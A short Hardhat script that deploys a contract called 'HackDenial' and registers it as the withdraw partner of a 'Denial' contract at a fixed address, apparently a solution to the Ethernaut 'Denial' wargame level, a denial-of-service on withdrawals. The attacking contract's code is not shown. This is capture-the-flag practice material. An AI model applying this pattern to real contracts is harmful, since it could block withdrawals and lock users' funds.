import { ethers } from "hardhat";

const INSTANCE = "0x826A04B2f4e9a41e3BADe529666466C5f9518E79";

async function main() {
  const HackDenial = await ethers.getContractFactory("HackDenial");
  const hackDenial = await HackDenial.deploy();
  await hackDenial.deployed();

  const denial = await ethers.getContractAt("Denial", INSTANCE);
  const setPartner = await denial.setWithdrawPartner(hackDenial.address);
  await setPartner.wait();
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
